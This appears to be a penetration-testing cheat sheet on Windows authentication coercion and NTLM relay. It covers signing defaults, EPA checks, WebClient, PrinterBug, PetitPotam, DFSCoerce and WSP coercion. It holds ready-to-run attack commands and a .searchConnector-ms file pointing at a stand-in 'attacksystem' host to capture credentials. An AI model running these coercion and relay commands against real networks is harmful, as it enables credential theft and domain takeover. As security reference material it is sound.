# Internal - Coerce

Coerce refers to forcing a target machine (usually with SYSTEM privileges) to authenticate to another machine.

## Signing

### Server Side Signing

| Operating System | SMB Signing | LDAP Signing |
| ------------------------------- | --- | --- |
| Windows Server 2019 DC          | ✅  |  ❌ |
| Windows Server 2022 DC pre 23H2 | ✅  |  ❌ |
| Windows Server 2022 DC 23H2     | ✅  |  ✅ |
| Windows Server 2025 DC          | ✅  |  ✅ |
| Windows Server 2019 Member      | ❌  |  -  |
| Windows Server 2022 Member      | ❌  |  -  |
| Windows Server 2025 Member      | ❌  |  -  |
| Windows 10                      | ❌  |  -  |
| Windows 11 23H2                 | ❌  |  -  |
| Windows 11 24H2                 | ✅  |  -  |

* Server-side SMB signing has been enabled on domain controllers
* Server-side SMB signing is still not required by default on non-DC Windows server

### EPA

* [zyn3rgy/RelayInformer](https://github.com/zyn3rgy/RelayInformer) - Python and BOF utilites to the determine EPA enforcement levels of popular NTLM relay targets from the offensive perspective.

```ps1
uv run relayinformer mssql --target 10.10.10.10 --user USER --password PASSWORD
uv run relayinformer http --url http://10.10.10.10/page --user USER --password PASSWORD
uv run relayinformer ldap --method BOTH --dc-ip 10.10.10.10 --user USER --password PASSWORD
uv run relayinformer ldap --method LDAPS --dc-ip 10.10.10.10 --user USER --password PASSWORD
```

| EPA Values | Description |
| ---------- | ----------- |
| Disabled / Never | You should generally be able to target with NTLM relay, regardless of the client's support for EPA or version of NTLM being used. |
| Allowed / Accepted / When Supported | You can theoretically conduct an NTLM relay but common relay scenarios will not work because standard coercion / poisoning techniques (mentioned above) will result in the addition of EPA-relevant AV pairs, indicating the client’s support for EPA. |
| Required | NTLM relay should be prevented by validation of values provided in EPA-relevant AV pairs. |

## WebClient Service

* On Windows workstations, the WebClient service is installed by default.
* On Windows servers, it is not installed by default

**Enable WebClient**:

WebClient service can be enabled on the machine using several techniques:

* Mapping a WebDav server using `net` command : `net use ...`
* Typing anything into the explorer address bar that isn't a local file or directory
* Browsing to a directory or share that has a file with a `.searchConnector-ms` extension located inside.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
        <description>Microsoft Outlook</description>
        <isSearchOnlyItem>false</isSearchOnlyItem>
        <includeInStartMenuScope>true</includeInStartMenuScope>
        <templateInfo>
            <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
        </templateInfo>
        <simpleLocation>
            <url>http://attacksystem/path</url>
        </simpleLocation>
    </searchConnectorDescription>
    ```

Check if the WebDav service is running

```ps1
nxc smb <ip> -u 'user' -p 'pass' -M webdav
```

## MS-RPRN - PrinterBug

**Tools**:

* [leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample) - PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface.

**Examples**:

```ps1
poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PrinterBug
```

Checking if the Spooler Service is running.

```ps1
nxc smb <ip> -u 'user' -p 'pass' -M spooler
```

## MS-EFSR - PetitPotam

The tools use the LSARPC named pipe with interface `c681d488-d850-11d0-8c52-00c04fd90f7e` because it's more prevalent. But it's possible to trigger with the EFSRPC named pipe and interface `df1941c5-fe89-4e79-bf10-463657acf44d`.

**Tools**:

* [topotam/PetitPotam](https://github.com/topotam/PetitPotam) - PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.

**Examples**:

```ps1
poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PetitPotam
```

## MS-DFSNM - DFS Coercion

DFS Coerce (MS-DFSNM abuse) is a technique to force a Windows system to authenticate to an attacker-controlled machine by abusing the DFS Namespace Management RPC interface.

**Tools**:

* [Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) - PoC for MS-DFSNM coerce authentication using NetrDfsRemoveStdRoot and NetrDfsAddStdRoot methods.

**Examples**:

```ps1
python3 dfscoerce.py -u username -d domain.local 10.10.10.10 10.10.10.11
poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=DFSCoerce
```

## MS-WSP - WSP Coercion

* The `wsearch` service is only enabled by default on workstations, and has been disabled on servers since Server 2016.
* Only SMB connections can be coerced with WSP.

**Tools**:

* [slemire/WSPCoerce](https://github.com/slemire/WSPCoerce) - PoC to coerce authentication from Windows hosts using MS-WSP.
* [RedTeamPentesting/wspcoerce](https://github.com/RedTeamPentesting/wspcoerce) - wspcoerce coerces a Windows computer account via SMB to an arbitrary target using MS-WSP.

**Examples**:

```ps1
WSPCoerce.exe <target> <listener>
WSPCoerce.exe labsw1 172.23.10.109
WSPCoerce.exe labsw1 labsrv1

wspcoerce 'lab.redteam/rtpttest:test1234!@192.0.2.115' "file:////attacksystem/share"
ntlmrelayx.py -t "http://192.0.2.5/certsrv/" -debug -6 -smb2support --adcs
```

* Can't use an IP address for the target, use a short hostname only (no FQDN)
* Make sure to use a hostname or FQDN for the listener if you want to receive Kerberos auth

## References

* [Changes to SMB Signing Enforcement Defaults in Windows 24H2 - Michael Grafnetter - January 26, 2025](https://www.dsinternals.com/en/smb-signing-windows-server-2025-client-11-24h2-defaults/)
* [Less Praying More Relaying – Enumerating EPA Enforcement for MSSQL and HTTPS - Nick Powers, Matt Creel - November 25, 2025](https://specterops.io/blog/2025/11/25/less-praying-more-relaying-enumerating-epa-enforcement-for-mssql-and-https/)
* [The Ultimate Guide to Windows Coercion Techniques in 2025 - RedTeam Pentesting - June 4, 2025](https://blog.redteam-pentesting.de/2025/windows-coercion/)
